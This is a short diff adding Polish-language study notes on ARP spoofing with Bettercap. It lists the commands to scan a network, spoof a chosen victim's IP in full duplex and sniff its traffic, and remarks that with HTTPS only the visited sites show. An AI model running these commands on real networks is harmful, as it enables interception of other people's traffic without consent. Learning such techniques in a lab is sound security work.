@@ -1,0 +1,9 @@
+1) Bettercap
+      • ArpSpoofing
+            ▪ bettercap
+               - net.probe on  (wyswietli dostepne maszyny w sieci)
+               - set arp.spoof.fullduplex true
+               - set arp.spoof.targets <ip> (ustawiamy ip ofiary)
+               - net.sniff on
+            ▪ Teraz z maszynki ofiary wchodzimy na jakas strone i widzimy wszystko w konsoli
+            ▪ No po https zobaczymy tylko na jakie strony wchodzi ofiara
